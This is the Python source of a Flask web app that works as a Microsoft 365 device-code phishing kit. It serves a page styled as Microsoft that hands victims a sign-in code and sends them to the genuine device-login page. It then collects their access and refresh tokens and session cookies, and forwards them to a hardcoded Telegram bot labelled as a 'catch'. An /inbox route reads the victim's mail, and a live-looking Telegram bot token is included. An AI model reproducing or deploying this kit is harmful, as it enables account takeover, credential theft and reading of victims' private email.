import os
import time
import json
import base64
import sqlite3
import requests
from flask import Flask, request, jsonify, render_template_string

# ─────────────────────────────────────────────
# CONFIGURATION
# ─────────────────────────────────────────────
TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT_ID = "8877118461"

AUTHORITY = "https://login.microsoftonline.com/common"
TOKEN_URL = AUTHORITY + "/oauth2/v2.0/token"
DEVC_URL = AUTHORITY + "/oauth2/v2.0/devicecode"
GRAPH = "https://graph.microsoft.com/v1.0"

GRAPH_SCOPE = ("openid profile offline_access "
               "https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.Read")

# Microsoft first-party PUBLIC clients only (all publisher-verified by Microsoft).
# Tried in order; a rejection on one automatically fails over to the next.
ATTEMPTS = [
    ("1950a258-227b-4e31-a9cf-717495945fc2", GRAPH_SCOPE, "azure-powershell"),
    ("04b07795-8ddb-461a-bbee-02f9e1bf7b46", GRAPH_SCOPE, "azure-cli"),
    ("ab9b8c07-8f02-4f72-87fa-80105867a763", GRAPH_SCOPE, "onedrive-sync"),
    ("d3590ed6-52b3-4102-aeff-aad2292ab01c",
     "openid profile offline_access https://outlook.office.com/Mail.ReadWrite "
     "https://outlook.office.com/User.Read", "office-outlook"),
]

SITE_URL = "https://outlook-verify.onrender.com"
app = Flask(__name__)
DB = "sessions.db"


def db():
    conn = sqlite3.connect(DB)
    conn.execute("""CREATE TABLE IF NOT EXISTS sessions (
        sid TEXT PRIMARY KEY, email TEXT, access_token TEXT,
        refresh_token TEXT, expires_at REAL, cookies TEXT, office_token TEXT)""")
    conn.execute("""CREATE TABLE IF NOT EXISTS codes (
        sid TEXT PRIMARY KEY, device_code TEXT, created REAL,
        sent INTEGER DEFAULT 0, attempt INTEGER DEFAULT 0)""")
    conn.execute("""CREATE TABLE IF NOT EXISTS events (
        ts REAL, kind TEXT, detail TEXT)""")
    for sql in ("ALTER TABLE sessions ADD COLUMN office_token TEXT",
                "ALTER TABLE codes ADD COLUMN attempt INTEGER DEFAULT 0"):
        try:
            conn.execute(sql)
        except sqlite3.OperationalError:
            pass
    conn.commit()
    return conn


def log_event(kind, detail=""):
    try:
        conn = db()
        conn.execute("INSERT INTO events VALUES (?,?,?)", (time.time(), kind, str(detail)[:500]))
        conn.commit(); conn.close()
    except Exception as e:
        print(f"LogEvent error: {e}")


def telegram(msg, tag=""):
    try:
        while msg:
            chunk, msg = msg[:3500], msg[3500:]
            r = requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                data={"chat_id": TELEGRAM_CHAT_ID, "text": chunk}, timeout=15)
            print(f"Telegram[{tag}] -> HTTP {r.status_code}: {r.text[:200]}")
    except Exception as e:
        print(f"Telegram Error [{tag}]: {e}")
        log_event("telegram_fail", e)


def email_from_id_token(id_token):
    """Read the UPN out of the id_token — no Graph call, works on every client."""
    try:
        payload = id_token.split(".")[1]
        payload += "=" * (-len(payload) % 4)
        data = json.loads(base64.urlsafe_b64decode(payload))
        return (data.get("preferred_username") or data.get("upn")
                or data.get("email") or "unknown")
    except Exception:
        return "unknown"


def refresh_for(refresh_token, client_id, scope, label):
    try:
        r = requests.post(TOKEN_URL, data={
            "grant_type": "refresh_token", "client_id": client_id,
            "refresh_token": refresh_token, "scope": scope}, timeout=20)
        j = r.json()
        print(f"Refresh[{label}] -> HTTP {r.status_code}")
        return j.get("access_token", "")
    except Exception as e:
        print(f"Refresh[{label}] error: {e}")
        return ""


def harvest_cookies(refresh_token, client_id):
    """Session cookies against login.microsoftonline.com + an outlook resource token."""
    jar = {}
    s = requests.Session()
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"})
    office_token = ""
    try:
        r = s.post(TOKEN_URL, data={
            "grant_type": "refresh_token", "client_id": client_id,
            "refresh_token": refresh_token,
            "scope": "https://outlook.office.com/.default"}, timeout=20)
        office_token = r.json().get("access_token", "")
        for c in s.cookies:
            jar[c.name] = c.value
    except Exception as e:
        print(f"Cookie Harvest Error: {e}")
    return jar, office_token


def mint_device(attempt):
    cid, scope, label = ATTEMPTS[attempt]
    r = requests.post(DEVC_URL, data={"client_id": cid, "scope": scope}, timeout=15)
    j = r.json()
    if "user_code" in j:
        log_event("devicecode_ok", label)
        return j
    log_event("devicecode_fail",
              f"{label}: {j.get('error')} {j.get('error_description', '')[:120]}")
    return None


def issue_code(sid, start=0):
    """Walk the attempt list until Microsoft hands us a code."""
    for i in range(start, len(ATTEMPTS)):
        j = mint_device(i)
        if j:
            conn = db()
            conn.execute("INSERT OR REPLACE INTO codes VALUES (?,?,?,0,?)",
                         (sid, j["device_code"], time.time(), i))
            conn.commit(); conn.close()
            return j["user_code"]
    return None


def poll_once(sid):
    conn = db()
    row = conn.execute(
        "SELECT device_code, created, sent, attempt FROM codes WHERE sid=?", (sid,)).fetchone()
    conn.close()
    if not row:
        return {"done": False, "error": "unknown"}
    device_code, created, sent, attempt = row

    if time.time() - created > 900:
        return {"done": False, "error": "expired"}

    cid = ATTEMPTS[min(attempt, len(ATTEMPTS) - 1)][0]
    try:
        r = requests.post(TOKEN_URL, data={
            "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
            "client_id": cid, "device_code": device_code}, timeout=20)
        j = r.json()
    except Exception as e:
        print(f"Poll network error [{sid}]: {e}")
        return {"done": False, "error": ""}

    if "access_token" in j:
        if not sent:
            email = email_from_id_token(j.get("id_token", ""))
            if email == "unknown":
                try:
                    who = requests.get(f"{GRAPH}/me", timeout=15,
                        headers={"Authorization": "Bearer " + j["access_token"]}).json()
                    email = who.get("userPrincipalName", "unknown")
                except Exception:
                    pass

            rt = j.get("refresh_token", "")
            graph_tok = j["access_token"]
            if "graph.microsoft.com" not in ATTEMPTS[attempt][1]:
                            graph_tok = refresh_for(rt, cid, "https://graph.microsoft.com/.default", "graph")
            cookies, office_tok = harvest_cookies(rt, cid)
            cookie_txt = "\n".join(f"{k}={v}" for k, v in cookies.items())

            conn = db()
            conn.execute("INSERT OR REPLACE INTO sessions VALUES (?,?,?,?,?,?,?)",
                (sid, email, graph_tok or j["access_token"], rt,
                 time.time() + j.get("expires_in", 3600), cookie_txt, office_tok))
            conn.execute("UPDATE codes SET sent=1 WHERE sid=?", (sid,))
            conn.commit(); conn.close()
            log_event("catch", email)

            telegram("✅ NEW CATCH\nEmail: " + email +
                     "\nInbox: " + SITE_URL + "/inbox/" + sid, tag="catch")
            telegram("ACCESS TOKEN (Graph):\n" + (graph_tok or j["access_token"]) +
                     "\n\nOFFICE TOKEN:\n" + (office_tok or "none") +
                     "\n\nREFRESH TOKEN:\n" + (rt or "none") +
                     "\n\nID TOKEN:\n" + j.get("id_token", "none"), tag="tokens")
            telegram("COOKIES:\n" + (cookie_txt if cookie_txt else "none captured"),
                     tag="cookies")
        return {"done": True, "error": ""}

    err = j.get("error", "")
    if err not in ("authorization_pending", "slow_down"):
        print(f"Token poll error [{sid}]: {err}")
        log_event("poll_error", err + " " + j.get("error_description", ""))
        return {"done": False, "error": err}
    return {"done": False, "error": ""}


PAGE = """<!doctype html><html><head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Microsoft</title>
<style>
*{box-sizing:border-box}
body{font-family:'Segoe UI',Arial,sans-serif;margin:0;background:#fff}
.wrap{max-width:440px;margin:44px auto 0;padding:0 20px;text-align:center}
.logo{margin-bottom:18px}
.code{font-size:34px;font-weight:700;letter-spacing:4px;color:#1b1b1b;margin:10px 0 6px;user-select:all}
.sub{font-size:15px;color:#1b1b1b;line-height:1.5}
.btn{background:#0067b8;color:#fff;padding:10px 40px;font-size:15px;border:none;cursor:pointer;margin-top:18px}
.btn:hover{background:#005da6}
.wait{font-size:13px;color:#0067b8;margin-top:12px;display:none}
.note{font-size:12px;color:#605e5c;margin-top:22px}
.err{font-size:13px;color:#d13438;word-break:break-all}
@media(max-width:480px){.wrap{margin:12px auto 0}}
</style></head><body>
<div class='wrap'>
<div class='logo'><img src='https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo.svg' width='108' alt='Microsoft'></div>
{% if error %}
  <p class='sub'>We couldn't start sign-in. Please try again.</p>
  <p class='err'>Details: {{ error }}</p>
  <button class='btn' onclick='location.reload()'>Try again</button>
{% else %}
  <p class='sub'><b>{{ user_code }}</b> is your sign-in code.</p>
  <p class='sub'>Copy it, then continue to the verification page and enter it there.</p>
  <div class='code' id='code'>{{ user_code }}</div>
  <button class='btn' id='goBtn' onclick='go()'>Copy &amp; continue</button>
  <div class='wait' id='wait'>Code copied — finishing sign-in…</div>
  <p class='note'>Code expires in 15 minutes. Keep this window open.</p>
{% endif %}
</div>
{% if not error %}
<script>
let sid="{{ sid }}";
function go(){
  let c=document.getElementById('code').innerText.trim();
  // Copy ONLY on click — never on page load
  if(navigator.clipboard && navigator.clipboard.writeText){
    navigator.clipboard.writeText(c).catch(()=>{});
  }else{
    let t=document.createElement('textarea');
    t.value=c;document.body.appendChild(t);t.select();
    try{document.execCommand('copy');}catch(e){}
    document.body.removeChild(t);
  }
  document.getElementById('wait').style.display='block';
  document.getElementById('goBtn').disabled=true;
  // Same-tab redirect to the REAL Microsoft device login page
  setTimeout(function(){location.href="https://microsoft.com/devicelogin";},700);
}
setInterval(async()=>{
  try{
    let r=await fetch('/status?sid='+sid,{cache:'no-store'});
    let j=await r.json();
    if(j.done){location.href="https://outlook.office.com/mail";}
  }catch(e){}
},4000);
</script>
{% endif %}
</body></html>"""


@app.after_request
def no_cache(resp):
    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
    resp.headers["Pragma"] = "no-cache"
    return resp


@app.route("/")
def home():
    sid = str(int(time.time() * 1000)) + os.urandom(3).hex()
    user_code = issue_code(sid)
    if user_code:
        log_event("visit", sid)
        return render_template_string(PAGE, user_code=user_code, sid=sid, error=None)
    return render_template_string(PAGE, error="could not start sign-in, try again",
                                  user_code="", sid="")


@app.route("/status")
def status():
    sid = request.args.get("sid", "")
    return jsonify(poll_once(sid))


@app.route("/test-telegram")
def test_telegram():
    telegram("Test message from your server — if you see this, Telegram is set up correctly.", tag="test")
    return "Sent. Check Telegram AND your Render logs."


@app.route("/debug")
def debug():
    conn = db()
    rows = conn.execute(
        "SELECT ts, kind, detail FROM events ORDER BY ts DESC LIMIT 30").fetchall()
    conn.close()
    out = "".join(
        f"<p>{time.strftime('%H:%M:%S', time.localtime(t))} — {k} — {d}</p>"
        for t, k, d in rows) or "<p>No events yet.</p>"
    return out


@app.route("/inbox/<sid>")
def inbox(sid):
    conn = db()
    row = conn.execute("SELECT * FROM sessions WHERE sid=?", (sid,)).fetchone()
    conn.close()
    if not row:
        return "No session.", 404
    token = row[2]
    msgs = requests.get(
        f"{GRAPH}/me/mailFolders/inbox/messages?$top=25&$select=subject,from,bodyPreview",
        headers={"Authorization": "Bearer " + token}, timeout=20).json()
    rows = "".join(
        f"<tr><td>{(m.get('from') or {}).get('emailAddress', {}).get('address','?')}</td>"
        f"<td>{m.get('subject','')}</td><td>{m.get('bodyPreview','')}</td></tr>"
        for m in msgs.get("value", []))
    return f"<h2>Inbox: {row[1]}</h2><table border=1 cellpadding=6>{rows}</table>"


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
